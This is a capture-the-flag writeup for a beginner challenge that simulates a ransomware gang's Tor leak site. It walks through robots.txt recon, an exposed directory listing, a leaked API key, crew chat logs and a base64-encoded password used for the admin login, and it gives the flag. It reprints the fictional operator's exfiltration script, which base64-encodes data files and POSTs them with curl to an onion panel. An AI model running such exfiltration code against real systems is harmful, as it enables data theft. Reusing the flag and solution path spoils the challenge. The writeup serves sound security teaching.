# Sisterhood of the Traveling Packets — WiCyS x Flare x SANS CTF Writeup

**Category:** Web Exploitation / OSINT / Recon
**Difficulty:** Beginner-friendly
**Platform:** Tor Hidden Service (.onion)
**Flag:** `flare{pantal0n3s_g0t_pantsed_2026}`

## Challenge Overview

The challenge simulates a ransomware group's dark web leak site ("pantalones"). The player takes on the role of a threat intelligence researcher investigating the group's infrastructure to uncover operational security (OPSEC) failures — ultimately gaining access to the group's internal admin panel and recovering the flag from their operator dashboard.

The site is hosted exclusively as a Tor hidden service and requires the Tor Browser (or a SOCKS5-proxied client) to access.

## Recon: Mapping the Site

The landing page (`index.php`) is a "leak site" listing ransomware victims with countdown timers to publication. Viewing the page source revealed a base64-encoded HTML comment:

```html
<!-- bm90X3RoZV9mbGFnX2tlZXBfbG9va2luZw== -->
```

Decoding it yields `not_the_flag_keep_looking` — a deliberate red herring meant to bait players into stopping too early.

The site's navigation exposed three additional static pages: `crew.php`, `about.php`, and (not yet visible in the nav) `admin.php`.

**`crew.php`** listed four group members and their roles:

| Alias | Role |
|---|---|
| vex | operator / panel dev |
| crypt | payload engineer |
| mora | negotiations |
| skid | initial access |

The "panel dev" title next to `vex` was the first hint that an admin panel existed somewhere on the site.

## Discovering Hidden Endpoints

Checking `robots.txt` — a classic first move for enumerating an unlinked attack surface — disclosed two disallowed paths that were never linked in the site's navigation:

```
User-agent: *
Disallow: /api.php
Disallow: /admin.php
```

Visiting `/admin.php` revealed a login form (`username` / `password`, POST-based) guarded by an in-page warning aimed at "researchers." Visiting `/api.php` without parameters returned a JSON error listing valid actions:

```json
{
  "error": "missing required parameter: action",
  "valid_actions": ["upload", "status", "messages", "decrypt", "wallets", "payloads", "exfil"]
}
```

## Exploiting Directory Listing on Leak Downloads

The leak site listed two "already leaked" victims (QuantumCore Systems and AetherFlow Enterprises) with download links to `.zip` archives. Browsing to the parent download directories directly (rather than only fetching the zip) revealed that directory listing was enabled, exposing files that were never linked from the zip download button:

```
Index of /downloads/quantumcore
employees.sql
financial_summary_q1_2026.sql
internal_comms.csv
quantumcore_leak.zip
```

Most of these `.sql` dumps (customer records, ML model hyperparameters, financial summaries) were realistic-looking decoys with no credentials. The actual find was a hidden dotfile, `.exfil.sh`, left behind in the quantumcore directory — the operator's own data-exfiltration script, accidentally shipped along with the leak:

```bash
#!/bin/bash
# aetherflow staging dump - vex 05/30
PANEL="http://6562q4ut6lpt6r3s37kxilu2huuou2qia23jzlzmlqqznqv5sfbp2xid.onion/"
KEY="pantalonesgroup"

TARGETS=(
    "route_algorithms_PROPRIETARY.sql"
    "customers.sql"
    "api_keys_internal.yaml"
)

for f in "${TARGETS[@]}"; do
    [ -f "$f" ] || continue
    [ "$f" = ".exfil.sh" ] && continue
    b64=$(base64 -w0 "$f")
    curl -s -X POST "${PANEL}/api.php?action=upload" \
        -H "X-Panel-Key: ${KEY}" \
        -d "chunk=${b64}&fname=${f}&tag=aetherflow"
    echo "[+] sent: $f"
done
```

This script leaked two critical pieces of information: the internal panel's API authentication header (`X-Panel-Key: pantalonesgroup`) and confirmation that the same key authenticates against `/api.php` on the public leak site.

## Querying the Authenticated API

With the panel key in hand, `api.php` could be queried with the disclosed actions:

```bash
curl -s "http://<onion>/api.php?action=status" \
    -H "X-Panel-Key: pantalonesgroup" \
    --socks5-hostname 127.0.0.1:9050
```

This returned panel metadata, including a list of currently "online" operators (`vex`, `crypt`), confirming `vex` as a valid, active username for the admin login.

The `messages` action required an additional `conversation_id` parameter. Iterating through low integers surfaced internal crew chat logs. Conversation `2` contained an exchange where `crypt` shared a credential with `mora`, deliberately obfuscated per crew "OPSEC" policy:

```
mora: hey @crypt whats my password for the FTP server again? i reset my machine and lost it
crypt: UGFudGFsMG4zc19SdWwzeiE= - thats YOUR password mora. i encoded it this time, figure it out yourself.
```

Decoding the base64 string:

```bash
echo "UGFudGFsMG4zc19SdWwzeiE=" | base64 -d
# → Pantal0n3s_Rul3z!
```

The same chat log also contained an in-universe hint about the very vulnerability being exploited — `crypt` warning the crew that the `.exfil.sh` dotfile had been left in a published leak and that the panel key should be rotated, which `vex` and `mora` dismissed.

## Gaining Admin Access

Using the recovered credentials against the login form at `/admin.php`:

```
Username: mora
Password: Pantal0n3s_Rul3z!
```

authenticated successfully and returned the operator dashboard. The dashboard listed each "victim" alongside their ransom demand and decryption key. The entry for the CTF's own meta-victim, "Sisterhood of the Traveling Packets," contained the flag in place of a decryption key:

```
flare{pantal0n3s_g0t_pantsed_2026}
```

## Root Causes / OPSEC Failures Chained

1. **Directory listing enabled** on leak download folders, exposing files never intended to be public.
2. **Sensitive automation script left in a public archive**, hardcoding an internal API key and a second, "private" panel address.
3. **Unauthenticated `robots.txt` disclosure** of sensitive endpoints (`admin.php`, `api.php`) intended to be hidden by obscurity rather than access control.
4. **Security-through-obscurity reasoning** ("it's behind Tor who cares") instead of actual authentication on `admin.php`.
5. **Weak "obfuscation" of credentials in chat** — base64 is encoding, not encryption, and was trivially reversible.
6. **Credential reuse** between the FTP server context and the admin panel login.

## Tools Used

- Tor Browser / `tor` daemon with SOCKS5 proxy (`127.0.0.1:9050`)
- `curl` (with `--socks5-hostname` for .onion requests)
- `base64` for decoding
- `jq` for formatting JSON API responses
- Browser DevTools / view-source for static recon
